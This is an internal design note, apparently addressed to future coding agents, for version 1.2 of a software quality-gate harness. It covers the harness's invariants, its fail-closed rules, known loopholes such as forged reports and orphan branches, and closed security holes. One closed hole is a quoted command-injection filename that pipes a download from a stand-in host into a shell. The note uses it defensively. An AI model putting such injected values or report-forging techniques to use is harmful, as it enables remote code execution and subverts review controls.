# Harness v1.2 — Context for Future Agents

Read this before changing the quality gate, the risk router, any reviewer's scoring, the Judge
rubric, or the session-boundary skills. It captures what v1.1 left unmeasured, what v1.2 changed,
and the invariants you must not break.

Read `v1.1-context.md` first — its six invariants all still hold.

## TL;DR

v1.1 made **plans** lean and parallel. v1.2 makes **verification numeric**, **review depth
computed**, and the **approval bar derived instead of invented**.

## What came next

v1.3 is built and documented in `docs/harness/continual-harness.md` and
`docs/harness/v1.3-context.md`. **v1.2 measures the artifact; v1.3 measures the agent.** The
invariants below are untouched, and the fail-closed machinery they describe is what v1.3 builds on.

## The finding that caused this

Before v1.2 the harness's approval bar was `agent/spec-lead.md`:

> both emit a 0–10 score. Both ≥9 with zero critical/blocking issues → recommend approval

Two scores, from `code-reviewer` and `architecture-reviewer`, **neither receiving a single measured
number**, both running the cheapest model in the matrix. Everything downstream — Judge, commit,
handoff — inherited that verdict. Meanwhile `code-reviewer` asked "*Is test coverage adequate?*"
with no data, and carried a file-length threshold in prose that `web-platform-engineer` duplicated
and any real threshold contradicted.

**A future agent needs to know that old `≥9` meant nothing measured, or it will "restore" it.**

The full inventory of 17 findings is in
`agent-os/specs/2026-08-10-1435-measured-quality-gates/audit.md`; the 13 mechanical defects the
review then found in the plan itself are in that folder's `review-findings.md`.

## The evidence spine

Every arrow already existed. v1.2 made each one carry numbers:

```
ticket (measurable AC + risk tier)
  → lane implements (TDD → local gate → returns the metric table)
    → scheduler (full gate: mutation + regression + e2e → risk router)
      → reviewers (score DERIVED from metrics; judgement only on the blind spots)
        → Judge (numeric pass criteria wherever a number exists)
          → commit (metrics in the trailer)
            → PR (metric table, tier, and what a human must read)
              → write-back (ratchet + this project's AGENTS.md / review.md learn)
```

## New invariants (7–15)

7. Thresholds live in `agent-os/quality-thresholds.json`. A loosening requires a dated reason in
   `agent-os/quality-decisions.md`; the gate compares against the merge-base and refuses a silent one.
8. **Gates are categorical only.** Continuous-drift metrics (allocations, queries per action,
   response time) are advisory under `harness-benchmark`, never gates.
9. Mutation, regression and E2E run **once per run, at the scheduler** — never per lane.
10. A high-risk path forces tier `full` and a human read, whatever the numbers say.
11. Exit 2 (gate broken) is never read as a code failure.
12. **Scores are derived.** No measurable dimension is scored by a model; a red measured row caps
    reviewer and Judge verdicts at 6 / Revise.
13. **No threshold in prose, anywhere.** Enforced by `--check-sources`.
14. A bug fix without a regression test is not a fix.
15. **Evidence travels.** Commit trailer and PR body carry the metrics. Push, merge and remote git
    stay operator actions.

And the one that outranks the rest:

> **The gate fails closed.** Missing, stale, `unconfigured`, or exit-2 → tier `full`, and no
> approval input is satisfied. A broken gate must never buy *less* review than v1.1 gave.

## Gotchas / honest caveats

- **`unavailable` accumulates.** A gate can exit 0 while measuring three of nine rows. Read the
  report, not the exit code. Every consumer is told to name the gaps; the temptation is to skip it.
- **The derived score falls back to judgement-only** when no report exists. That is correct, and it
  is also the failure mode to watch: a gate quietly broken for a week looks exactly like v1.1. The
  fallback must always be *stated*.
- **Mutation is slow and diff-aware scoping is imperfect.** The source experiment lists it as
  unsolved; so do we. Where a tool cannot scope to changed files, mutation is full-mode only.
- **The bug-fix-regression rule is the one heuristic in the gate.** It matches `fix|bug|regression`
  in the branch name or commit messages. Expect to tune it; it always explains why it fired.
- **Phase A blocks almost nothing, deliberately.** Only `regression_suite`. Skipping Phase A and
  setting aspirational thresholds is the fastest route to a gate everyone disables.
- **The judgement half is still on the cheap model.** With measurables removed, what remains in the
  reviewers is the hard part, and per the matrix it runs on `deepseek-v4-flash`. The spec left this
  as an open operator decision (accept it, or route tier `full` judgement to the paid model).
- **Every fail-open here was a bug once, and they came in two shapes.** First: a check reading only
  *committed* git state while the rest of the flow works on the working tree — if you add a rule that
  inspects the diff, ask what it does with an untracked file before shipping it. Second, and worse:
  the gate not verifying **its own inputs and outputs**. A report with no source hash, a report with
  `rows: []`, a config field outside the guard, the thresholds file outside the hash — four separate
  ways to make the control report success while measuring nothing. Anything the gate reads or writes
  must be as suspect as the code it measures.
- **The config guard is HEAD-relative, so an orphan branch escapes it.** `guardThresholds` decides
  "is this a fresh install?" from `git cat-file -e HEAD:<path>` — which closes the `git rm --cached`
  forgery (that leaves HEAD intact) but not `checkout --orphan` or a rewritten root commit, where HEAD
  legitimately has no thresholds file and no ancestry to compare. Closing it needs a trusted ref
  outside the branch. Declared, not fixed.
- **The source hash proves freshness, not authorship.** Anyone who can write to the repo and run the
  gate can produce a report with a correct hash and fabricated `pass` rows. Closing that needs
  signing, which is out of scope for a local harness — so do not describe the gate as a defence
  against an attacker with write access. It defends against **carelessness** and **silent erosion**,
  which is the actual problem.
- **The prior bar is the strictest of several candidates, never one artifact.** `baselineRegressions`
  compares against the strictest of (the thresholds file committed at HEAD, every plausible gate
  report). A planted report can only propose a *looser* bar, and a looser candidate never wins — which
  is what makes forging the *previous* report useless. That forgery was cheaper than forging the
  current one, because `docs/harness/quality/` is excluded from the source hash.
  **Residual:** with no committed ancestor at HEAD (fresh install, orphan branch, rewritten root),
  reports become the only candidate source and the defence degrades to single-source. Narrow and
  low-value — in that state there is no established baseline to loosen.
- **`baseline` is guarded against the previous report, not the merge-base.** For a ratchet metric the
  baseline is half the bar, and the gate writes it into the working tree — so at the merge-base a hand
  edit and a gate write are indistinguishable. A first attempt put it in the config fingerprint and a
  baseline lowered 70 → 5 came out classified as "tightening". `baselineRegressions()` compares
  against the bar the last report recorded, and the gate never loosens a ratchet, so any looser bar
  can only be a hand edit.
- **The trust boundary is real.** `commands.*` and `suites.*.command` are arbitrary code from a
  project-local file. Running the gate in an unread repo is running its Makefile;
  `--no-project-commands` is the safe mode. Documented in `measured-gates.md`.
- **`module_lines_max` still breaches on this harness's own code, and that is recorded, not fixed.**
  The core/adapters split was done for the dependency reason (the router needed a hash, not seven
  adapters) and it cut the largest module roughly in half <!-- prose-threshold-ok: reporting a
  measurement, not setting a bar --> — but all five new modules are still over the bar, and the
  current worst offender is the test file. The metric is in `observe`, so it
  blocks nothing. The response is deliberately *not* to raise the threshold: that is the ritual this
  whole design exists to avoid. See `agent-os/quality-decisions.md`.
- **Watch for false claims in this very document.** Three times during v1.2's construction a doc
  asserted coverage or compliance that the code did not have ("34 cases", "all three scripts", "every
  module under the bar"). Each was caught by a reviewer or a `wc -l`, not by the author. If you state
  a number or a "now clean" here, run the command first and paste what it said.

## Tests

`tests/harness-measured-gates.test.mjs` is the suite for this layer — run
`node --test tests/harness-measured-gates.test.mjs` and read the count it reports; do not restate a
number here that will drift (the figure once printed here is already wrong — the suite outgrew it).
It covers all five modules, including the compositions that shell out to git.

Three properties worth preserving:

- **The git-shelling compositions are tested through the injectable port.** `makeGit({ exec })` takes
  canned output, so `regressionTestRule`, `guardThresholds` and `collectDiffFacts` are assertable
  without a repository on disk. This matters because *every* fail-open in this system has lived in
  one of those compositions, and the reason they shipped untested was that the shelling used to be
  private. One test asserts a hostile filename reaches git as a single **argv entry** and never as
  command text.
- **Tests that guard a specific past bug name it** — "(review R2 finding 4)", "(security
  BLOCKING-2)". Not every case does; the ones covering a fixed defect do, and that is the point.
- **`checkSources` is asserted to find nothing in this repo**, with the root derived from
  `import.meta.url` rather than `cwd` (it passed vacuously when run from elsewhere). If that test
  fails, someone reintroduced a threshold in prose.

The suite is this repo's declared `suites.regression.command` (`npm test`), so `regression_suite`
measures something real here instead of reporting `unavailable`.

## How it was reviewed, and what that cost

Five review rounds, **54 findings, all accepted**. Final verdicts from the harness's own dual gate plus
the mandatory security axis:

| Axis | Trajectory |
|---|---|
| `code-reviewer` | 6 → 5 → 8 → **9/10** |
| `architecture-reviewer` | 6 → **9/10**, PASS, 0 blocking |
| `security-analyst` | BLOCK → BLOCK → **CLEAR** |

The number that matters more than the scores: **the same failure direction recurred five times.** Each
fix closed verification at one layer and left the layer beneath it open — report verified, the guard
reading the report not verified, the guard's source not verified, that source's reference not verified,
a new config key not verified. An external reviewer was needed at every layer. If you extend this
system, assume that pattern is still live in whatever you add.

Concretely, the holes that were found *after* the design was believed done:

- A filename could reach a shell (`foo;curl evil|sh;package.json`) — closed by the argv git port.
- A forged five-field JSON read as a green gate — closed by `assessReport`'s shape checks.
- `suites.regression.command → exit 0` disabled the only blocking metric — closed by the full config
  fingerprint.
- Removing `**/auth/**` after a green run dropped the mandatory-review tier — closed by putting the
  config into the source hash.
- A hand-lowered ratchet `baseline` escaped every check — closed by the strictest-candidate rule.
- Forging the *previous* report was cheaper than the current one — closed by the same rule.
- A `--review` file outside the repo satisfied tier `full` — closed by `resolveInsideRoot`.
- A review saying REQUEST CHANGES satisfied tier `full` — closed by `reviewApproves`.
